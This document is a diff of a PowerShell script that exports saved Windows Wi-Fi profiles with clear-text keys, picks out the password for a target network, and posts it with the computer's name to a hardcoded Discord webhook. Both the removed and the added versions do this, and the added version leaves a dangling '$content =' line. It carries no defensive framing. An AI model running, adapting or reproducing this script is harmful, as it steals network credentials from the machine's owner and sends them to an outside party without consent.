@@ -1,25 +1,41 @@
+$target = "netis_mesh_5G"
 $hookUrl = "https://discordapp.com/api/webhooks/1465987971466395773/oYnAK6pdTATSbadnkw-2fraAguGL88gI9NIlKnXijZlkFMeiDmgtgq-VevctXFzQ4C9O"
-$ssid = "netis_mesh_2G"
+$content = 
+$tempDir = Join-Path $env:TEMP ("wifi_profiles_" + [guid]::NewGuid())
+New-Item -ItemType Directory -Path $tempDir | Out-Null
 
-$tempPath = Join-Path $env:TEMP "wifi_export"
-New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
-netsh wlan export profile name="$ssid" folder="$tempPath" key=clear | Out-Null
-$xmlFile = Get-ChildItem -Path $tempPath -Filter "*.xml" |
-           Where-Object { $_.Name -like "*$ssid*" } |
-           Select-Object -First 1
+try {
+    netsh wlan export profile key=clear folder="$tempDir" | Out-Null
 
-if ($xmlFile) {
-    [xml]$xmlContent = Get-Content $xmlFile.FullName
-    $wifiPassword = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
-} else {
-    $wifiPassword = "not found"
+    $xmlFiles = Get-ChildItem -Path $tempDir -Filter "*.xml"
+    foreach ($file in $xmlFiles) {
+        [xml]$xml = Get-Content $file.FullName
+
+        $ssid = $xml.WLANProfile.name
+        $auth = $xml.WLANProfile.MSM.security.authEncryption.authentication
+        $passwordNode = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
+        
+        if($ssid -eq $target){
+            if($passwordNode){
+                $password = $passwordNode
+            }else{
+                if ($auth -eq "open") {
+                    $password = "(open network)"
+                }
+                else {
+                    $password = "(no stored key)"
+                }
+            }
+
+            $payload = @{
+                content = "# $env:COMPUTERNAME`n"+$password
+            } | ConvertTo-Json
+            Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
+            
+            break
+        }
+    }
 }
-
-Remove-Item $tempPath -Recurse -Force
-
-$content = "# $env:COMPUTERNAME`n"+$wifiPassword
-$payload = @{
-    content = $content
-} | ConvertTo-Json
-
-Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
+finally {
+    Remove-Item -Recurse -Force -Path $tempDir
+}
